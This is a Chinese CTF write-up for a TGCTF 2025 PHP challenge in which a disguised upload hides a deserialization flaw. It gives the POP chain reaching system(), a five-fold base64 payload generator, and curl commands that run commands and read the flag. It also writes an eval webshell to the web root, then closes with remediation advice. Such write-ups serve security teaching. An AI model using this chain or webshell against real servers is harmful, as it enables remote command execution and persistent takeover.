---
title: "TGCTF 2025：伪装上传 + 反序列化"
slug: "ctf-tgctf-2025-upload-deserialization"
date: 2026-08-31T22:19:57+08:00
lastmod: 2026-10-27T11:30:00+08:00
draft: false
author: ["xuanwo"]
description: "文件上传只是表象，真正的考点是 PHP 反序列化。"
summary: "文件上传只是表象，真正的考点是 PHP 反序列化。"
tags: ["CTF", "TGCTF", "文件上传", "反序列化"]
categories: ["CTF Writeup"]
series: ["CTF Writeup"]
weight: 12
ShowToc: true
TocOpen: false
hidemeta: false
comments: false
showReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowCodeCopyButtons: true
source_repo: "https://github.com/xuanwoLQL/security-notes/blob/main/ctf-writeups/12. TGCTF2025文件上传(伪装)+反序列化(实际).md"
---

## 复现流程图

<figure class="note-diagram">
  <img src="/images/notes/ctf-tgctf-2025-upload-deserialization/workflow.svg" alt="上传环节负责把可控内容送进应用，反序列化环节负责触发对象行为。" loading="lazy">
  <figcaption>图 1 · TGCTF 伪装上传与反序列化。上传环节负责把可控内容送进应用，反序列化环节负责触发对象行为。</figcaption>
</figure>

## 1. 原题链路

入口位于 `/class.php`：

```php
function best64_decode($str) {
    return base64_decode(base64_decode(base64_decode(
        base64_decode(base64_decode($str))
    )));
}

if (file_exists($_GET['filename'])) {
    echo "Focus on the previous step!<br>";
} else {
    $data = substr($_GET['filename'], 0, -4);
    unserialize(best64_decode($data));
}
```

因此 payload 需要：

1. 先序列化对象；
2. 连续 Base64 编码 5 次；
3. 末尾附加任意 4 个字符；
4. 通过 `filename` 提交。

## 2. 重构图中的对象链

```php
class yesterday {
    public $study;

    public function __destruct() {
        return $this->study->hard();
    }
}

class today {
    public $doing;

    public function __call($name, $args) {
        // md5() 会把对象转成字符串，从而触发 future::__toString()
        if (md5(md5($this->doing)) == 666) {
            return $this->doing();
        }
        return "reachable";
    }
}

class future {
    public function __toString() {
        system($_POST["wow"]);
        return "win";
    }
}
```

`today::__call()` 里的比较不是重点；`md5($this->doing)` 已经会触发
`future::__toString()`，命令在返回比较结果之前执行。

## 3. 完整 Payload 生成器

```php
<?php
class yesterday {
    public $study;
}

class today {
    public $doing;
}

class future {
}

$future = new future();
$today = new today();
$today->doing = $future;
$yesterday = new yesterday();
$yesterday->study = $today;

$payload = serialize($yesterday);

for ($i = 0; $i < 5; $i++) {
    $payload = base64_encode($payload);
}

echo $payload . "xxxx";
```

示例：

```bash
PAYLOAD="$(php build.php)"
echo "$PAYLOAD"
```

## 4. 向目标发送

```bash
curl -i -sS -X POST \
  --data-urlencode 'wow=id' \
  --get --data-urlencode "filename=$PAYLOAD" \
  'http://127.0.0.1:<target-port>/class.php'
```

读取 flag：

```bash
curl -sS -X POST \
  --data-urlencode 'wow=cat /flag' \
  --get --data-urlencode "filename=$PAYLOAD" \
  'http://127.0.0.1:<target-port>/class.php'
```

## 5. 用命令写 WebShell

先把一句话 Base64：

```bash
SHELL_B64="$(printf '%s' '<?php eval($_POST["cmd"]);?>' | base64 -w0)"
echo "$SHELL_B64"
```

通过 `wow` 写入：

```bash
curl -sS -X POST \
  --data-urlencode "wow=echo $SHELL_B64 | base64 -d > /var/www/html/shell.php" \
  --get --data-urlencode "filename=$PAYLOAD" \
  'http://127.0.0.1:<target-port>/class.php'
```

然后访问：

```text
http://127.0.0.1:<target-port>/shell.php
```

参数名：`cmd`。

## 6. 排错

| 现象 | 原因 |
| --- | --- |
| `unserialize` 返回 false | Base64 次数或末尾 4 字符不对 |
| `__destruct` 不触发 | 对象没有被真正恢复 |
| `__call` 不触发 | `today` 类里存在 `hard()` 或类名不一致 |
| `__toString` 不触发 | `doing` 不是对象或 md5 参数被提前处理 |
| 命令无回显 | `system` 禁用或输出被过滤 |

## 7. 修复

- 不对输入做多重 Base64 后直接反序列化；
- 禁止不可信 `unserialize`；
- `allowed_classes` 白名单；
- 不在 magic method 中调用用户可控 callable；
- 禁止 Web 进程执行系统命令。
